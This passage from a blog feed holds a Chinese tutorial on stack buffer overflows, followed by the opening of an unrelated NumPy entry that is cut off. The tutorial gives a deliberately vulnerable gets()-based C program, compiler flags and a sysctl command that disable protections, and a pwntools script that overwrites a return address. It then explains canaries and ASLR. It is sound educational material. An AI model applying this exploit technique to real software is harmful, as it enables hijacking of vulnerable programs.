定义一个简单的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sp</span><span class="params">(<span class="type">void</span>)</span>&#123; <span class="keyword">asm</span>(<span class="string">&quot;mov %rsp, %rax&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*func_ptr)(<span class="type">void</span>);</span><br><span class="line">    func_ptr = main;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main函数地址：%p   &quot;</span>,func_ptr);<span class="comment">//打印main函数地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> esp = sp();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;栈顶指针： (ESP : 0x%lx)\n&quot;</span>,esp);<span class="comment">//打印栈顶地址</span></span><br><span class="line"> </span><br><span class="line">    func_ptr();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc functionpointer.c -o functionpointer</span></span><br></pre></td></tr></table></figure><p>执行一下：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531213942052.png" alt="./functionpointer"></p><ul><li>可以看到main函数在递归调用自己n次后被操作系统终止了。</li><li>main函数地址没有发生改变，这是因为<code>main函数地址</code>所在是代码段，在运行时不会改变。</li><li>栈顶指针一直在减小，也是印证刚才函数调用栈的第二条结论——<strong>栈是反向增长的！</strong></li></ul><h4 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h4><p>我们也可以顺道一窥<code>linux内存布局</code>：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531224257981.png" alt="csapp——Linux x86-64运行时内存镜像"></p><ol><li>当我们<code>./program</code>执行程序时，可执行文件会被载入<code>读/写段</code>和<code>只读代码段</code>。</li><li>当程序运行时会将返回地址、局部变量等压入栈中，<code>rsp是反向增长的</code>。</li><li>调用<code>malloc、calloc</code>函数时，若分配器内存不够，则会调用<code>sbrk</code>获得更多堆内存。<code>brk是正向增长的</code>。</li></ol><h3 id="一个攻击例子"><a href="#一个攻击例子" class="headerlink" title="一个攻击例子"></a>一个攻击例子</h3><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;cmatrix&quot;</span>);  <span class="comment">//正常情况只有密码输入正确才能执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(s, <span class="string">&quot;012345678&quot;</span>))   success();       <span class="comment">//password</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector vulnerable.c -no-pie -o vulnerable    //编译vulnerable   </span></span><br><span class="line"><span class="comment">//gcc编译器  32位 关闭栈保护      源文件    关闭地址随机化  目的文件  </span></span><br></pre></td></tr></table></figure><p>输入正确的password将执行炫酷的<code>cmatrix</code>。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531230620460.png" alt="输入012345678"></p><h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><p>既然我们是讲栈溢出、那么来尝试通过栈溢出来控制程序执行流执行cmartix吧！！！！！！！！</p><ul><li>函数实质是<code>符号+地址</code>的组合，那返回父函数也应该是父函数的地址。</li><li>那么我们只需要用<code>success</code>函数的地址覆盖<code>vulnerable</code>函数的返回地址<code>retaddr</code>即可。</li><li><p>注意下linux是大多是以小端序存储的,输入0x12345678的内存布局如图所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址增量  →  [0x00000000]  [0x00000001]  [0x00000002]  [0x00000003]</span><br><span class="line">数据字节  →  0x78          0x56          0x34          0x12</span><br></pre></td></tr></table></figure></li></ul><p>下面是vulnerable函数的栈布局：</p><p>到retaddr需要：s字符数组 + 两寄存器 + ebp = 10 + 2*4 +4  = 22字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |     寄存器       |</span><br><span class="line">             |     寄存器       |</span><br><span class="line">             |     s[10]       |</span><br><span class="line">             |      ...        |</span><br><span class="line">             |      ...        |</span><br><span class="line">             |     s[0]        |</span><br><span class="line">s,ebp-0x12--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>栈溢出漏洞利用需要两个条件：</p><ul><li>有gets等漏洞利用函数，可以实现溢出。</li><li>需要知道我们想执行的函数的地址。</li></ul><p>那么接下来我们，使用<code>pwntools</code>破解程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./vulnerable&quot;</span>)<span class="comment">#vulnerable进程</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)<span class="comment">#32位，linux</span></span><br><span class="line">elf = ELF(<span class="string">&quot;vulnerable&quot;</span>)<span class="comment">#分析elf文件</span></span><br><span class="line">success_addr = elf.symbols[<span class="string">&quot;success&quot;</span>] <span class="comment">#得到success函数地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>) + <span class="string">b&#x27;aaaa&#x27;</span> +p32(success_addr)</span><br><span class="line"><span class="comment">#  填充的垃圾字符    ebp寄存器(保存调用函数的基地址）     success_addr(pwntools可以将地址转化为小端序)</span></span><br><span class="line"><span class="built_in">print</span>(p32(success_addr))</span><br><span class="line">sh.sendline(payload)//发送payload，实现栈溢出</span><br><span class="line">sh.interactive()//交互</span><br></pre></td></tr></table></figure><p>可以看到，即使我们没有密码，也可以执行程序，达到破解的目的。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531232136512.png" alt="使用pwntools破解程序"></p><h3 id="segmentation-fault和-stack-smash"><a href="#segmentation-fault和-stack-smash" class="headerlink" title="segmentation fault和 stack smash"></a>segmentation fault和 stack smash</h3><ul><li><p>当我们输入<code>AAAAAAAAAAA</code>时,我们实际输入为<code>0x414141414141</code>。</p></li><li><p>程序只能访问他可以访问的地址,这里使用<code>pwndgb</code>的<code>vmmap</code>查看可访问的内存布局，可以看到<code>0x414141414141</code>并不是程序可以访问的内存。</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531233314478.png" alt="vmmap"></p><p>为什么<code>demo</code>是 <code>stack smash</code> ，而<code>vulnerable</code>是<code>segmentation fault</code>？</p><p><code>segmentation fault</code> 和 <code>stack smash</code> 都是与内存访问相关的错误</p><ul><li><strong>Segmentation Fault</strong>：<ul><li>当程序尝试访问它不应该访问的内存地址时，会发生段错误。</li></ul></li><li><strong>Stack Smash</strong>：<ul><li>当程序尝试在栈上写入超出栈界限的内存时，会发生栈破坏。（开启Canary保护才会触发该错误）。</li></ul></li></ul><p>回想一下，我们使用了不同的编译选项（保护开关），造成了不同的报错。那么，接下来我们了解一下这些保护~~</p><h3 id="栈溢出的防护0x1：Canary"><a href="#栈溢出的防护0x1：Canary" class="headerlink" title="栈溢出的防护0x1：Canary"></a>栈溢出的防护0x1：Canary</h3><p><code>Canary</code>的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p><p><code>Canary</code>不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</p><p><code>canary保护</code>使得栈溢出到返回地址需要提前得知<code>canary</code>的值，而<code>canary</code>在每次运行程序时都发生变化。使得栈溢出漏洞利用难度大大增加。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517232939592.png" alt="csapp——金丝雀防护"></p><ul><li><code>Canary</code>随机数的第一个字节必然是 <strong>0x00</strong> 。如此设计的主要目的是实现字符串截断，以避免随机数被泄露。</li></ul><p>这也就解释了为什么<code>demo</code>能输入长度为10的字符串，最后的<code>\0</code>覆盖了canary的<code>0x00</code>,但是因为相较于原canary值没有变化，程序没有被终止。当输入长度为11的字符串时，canary值被改变，程序终止。</p><p>来，通过gdb调试demo来看看程序是如何设置canary值的：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601095421014.png" alt="设置canary值"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601095811047.png" alt="校验canary值"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601095705684.png" alt="canary值不匹配则跳转到__stack_chk_fail函数"></p><p>可以看到：</p><ol><li>在函数起始，将<code>gs:[0x14]</code>（即gs寄存器上偏移值为0x14地址上的canary值）移入栈中。</li><li>在函数即将返回时，比较栈上的canary值与<code>gs:[0x14]</code>的canary值：<ul><li>若相等则返回</li><li>若不相等则跳入<code>__stack_chk_fail</code>终止程序。</li></ul></li></ol><p>当然，我们可以实现自己的<code>canary</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cmatrix&quot;</span>); <span class="comment">//正常情况下这里不会执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> canaryprotect[<span class="number">8</span>] = <span class="string">&quot;0114514&quot;</span>;</span><br><span class="line">  canaryprotect[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//设置canary的第一个字节</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s, <span class="string">&quot;012345678&quot;</span>))</span><br><span class="line">    success();</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;你输错啦！~~~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(&amp;canaryprotect[<span class="number">1</span>], <span class="string">&quot;114514&quot;</span>) ||</span><br><span class="line">      canaryprotect[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) <span class="comment">//如果canary被破坏，则退出程序</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[95m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\ncanary生效\n\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cowsay 杂鱼~杂鱼~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//终止程序</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector canary.c --no-pie -o canary</span></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601101236925.png" alt="./canary"></p><p>可以看到自己写的canary保护也能模拟开启<code>stack-protector</code>保护程序的行为。</p><h3 id="栈溢出的防护0x2-ASLR"><a href="#栈溢出的防护0x2-ASLR" class="headerlink" title="栈溢出的防护0x2: ASLR"></a>栈溢出的防护0x2: ASLR</h3><p><code>ASLR（Address Space Layout Randomization，地址空间布局随机化）</code>是一种安全技术，用于防止攻击者利用固定的内存地址进行攻击。ASLR会在程序每次运行时随机化内存中的某些区域，包括堆（heap）、栈（stack）和库（libraries）的基址。</p><p>如果程序没有开启<code>PIE（Position-Independent Executable）</code>，那么程序的代码段（.text）和只读数据段（.rodata）将不会被随机化，因为它们在内存中的位置是固定的。这意味着即使系统开启了ASLR，程序的.text和.rodata段也不会享受到ASLR提供的保护。（<code>vulnerable</code>程序由于关闭<code>PIE</code>导致在开启<code>ASLR</code>保护的情况下被成功利用）</p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p>当开启ASLR保护时，由于函数地址在每次运行时都是随机的，攻击者若想要利用栈溢出漏洞来攻击程序，就需要泄露函数的真实地址。</p><p>我们可以通过打印<code>rsp</code>所指向的地址来判断ASLR是否开启。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sp</span><span class="params">(<span class="type">void</span>)</span>&#123; <span class="keyword">asm</span>(<span class="string">&quot;mov %rsp, %rax&quot;</span>);&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> esp = sp();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack pointer (ESP : 0x%lx)\n&quot;</span>,esp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cat /proc/sys/kernel/randomize_va_space     //查看是否开启地址随机化</span></span><br><span class="line"><span class="comment">//sudo sysctl -w kernel.randomize_va_space=0      //关闭地址随机化</span></span><br><span class="line"><span class="comment">//gcc ASLR.c -o ASLR</span></span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601101948984.png" alt="开启ASLR"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240601102041917.png" alt="关闭ASLR"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>总之，栈溢出漏洞利用需要两个条件：</p><ul><li>有gets等漏洞利用函数，可以实现溢出。</li><li>需要知道我们想执行的函数的地址。</li></ul></li><li><p>当然，想写出安全的程序需要我们：</p><ul><li><p>避免使用不安全的函数。</p></li><li><p>在编译时开启全部保护，同时在操作系统中也要保护全开。</p></li><li><p>定期进行代码审计。</p></li><li><p>使用fuzz测试程序。</p></li></ul></li></ul><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><p>《深入理解计算机系统》</p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">栈溢出原理 - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/427816095">【PWN】经典的栈溢出漏洞分析 - 知乎 (zhihu.com)</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/613650807">CTFer成长日记13：Canary的基本原理与绕过 - 知乎 (zhihu.com)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据分析0x1</title>
      <link href="/2024/05/18/python/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E5%B1%95%E7%A4%BA0x1/"/>
      <url>/2024/05/18/python/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E5%B1%95%E7%A4%BA0x1/</url>
      
        <content type="html"><![CDATA[<p>为科学计算和数据科学设计的Python发行版：<code>Canopy</code>和<code>Anaconda</code></p><h3 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h3><ul><li><p>包管理：<code>Conda</code>类似于<code>pip</code></p></li><li><p><code>spyder</code>：交互式Python语言开发环境</p></li><li><code>IPython</code>是一个用于交互式计算的Python工具<ul><li><code>a?</code>获得a的信息</li><li><code>%</code>魔术命令（Magic Commands）是特殊的命令,如<code>%run demo.py</code>执行当前目录下的demo.py。</li></ul></li></ul><h3 id="NumPy库入门"><a href="#NumPy库入门" class="headerlink" title="NumPy库入门"></a>NumPy库入门</h3><p>NumPy是一个开源的Python科学计算基础库，包含：</p><ul><li>一个强大的N维数组对象ndarray</li><li>广播功能函数</li><li>整合C/C++/Fortran代码的工具</li><li>线性代数 、傅里叶变换、随机数生成等功能<br>NumPy是SciPy、Pandas等数据处理或科学计算库的基础</li></ul><h4 id="数据的维度"><a href="#数据的维度" class="headerlink" title="数据的维度"></a>数据的维度</h4><div class="table-container"><table><thead><tr><th>维度</th><th>定义</th><th>表示方式</th></tr></thead><tbody><tr><td>一维数据</td><td>一维数据由对等关系的有序或无序数据构成，采用线性方式组织</td><td>列表和集合类型</td></tr><tr><td>二维数据</td><td>二维数据由多个一维数据构成，是一维数据的组合形式</td><td>列表类型</td></tr><tr><td>多维数据</td><td>多维数据由一维或二维数据在新维度上扩展形成(如大学排名随年份变化，即时间维度)</td><td>列表类型</td></tr><tr><td>高维数据</td><td>高维数据仅利用最基本的二元关系展示数据间的复杂结构(如键值对)</td><td>字典类型或JSON、XML和YAML格式</td></tr></tbody></table></div><p>Python中列表和NumPy数组的一些主要区别：</p><ul><li>列表是动态的，可以包含不同类型的元素（如整数、浮点数、字符串等）。</li><li>NumPy数组是静态的，通常所有元素都是相同类型的（例如，都是整数或都是浮点数）。</li></ul><h4 id="ndarray"><a href="#ndarray" class="headerlink" title="ndarray"></a>ndarray</h4><ul><li><code>ndarry</code>更适合计算。</li><li>由数据+元数据（数据维度、数据类型）</li><li>轴（axis）：保存数据的维度</li><li>秩（rank）：轴的数量</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240519222508219.png" alt="image-20240519222508219"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,],[<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>]])</span><br><span class="line"></span><br><span class="line">a.ndim</span><br><span class="line">Out[<span class="number">4</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">a.shape</span><br><span class="line">Out[<span class="number">5</span>]: (<span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">a.size</span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">10</span></span><br><span class="line"></span><br><span class="line">a.dtype</span><br><span class="line">Out[<span class="number">7</span>]: dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a.itemsize</span><br><span class="line">Out[<span class="number">8</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure><ul><li>避免使用非同质对象如<code>([[0,1,2,3,4,],[9,8,7,6]])</code></li></ul><h4 id="ndarray数组创建"><a href="#ndarray数组创建" class="headerlink" title="ndarray数组创建"></a>ndarray数组创建</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240519224334598.png" alt="image-20240519224334598"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">10</span>)</span><br><span class="line">Out[<span class="number">10</span>]: array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">np.ones((<span class="number">3</span>,<span class="number">6</span>))</span><br><span class="line">Out[<span class="number">11</span>]: </span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]])</span><br><span class="line"></span><br><span class="line">np.zeros((<span class="number">3</span>,<span class="number">6</span>), dtype = np.int32)</span><br><span class="line">Out[<span class="number">12</span>]: </span><br><span class="line">array([[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">np.eye(<span class="number">5</span>)</span><br><span class="line">Out[<span class="number">13</span>]: </span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">1.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">1.</span>]])</span><br><span class="line"></span><br><span class="line">x = np.ones((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">[[[<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line">  [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line">  [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]]</span><br><span class="line"></span><br><span class="line"> [[<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line">  [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]</span><br><span class="line">  [<span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span> <span class="number">1.</span>]]]</span><br><span class="line"></span><br><span class="line">x.shape</span><br><span class="line">Out[<span class="number">18</span>]: (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240519225953543.png" alt="image-20240519225953543"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">Out[<span class="number">20</span>]: array([ <span class="number">1.</span>,  <span class="number">4.</span>,  <span class="number">7.</span>, <span class="number">10.</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = np.linspace(<span class="number">1</span>,<span class="number">10</span>,<span class="number">4</span>,endpoint = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">Out[<span class="number">23</span>]: array([<span class="number">1.</span>  , <span 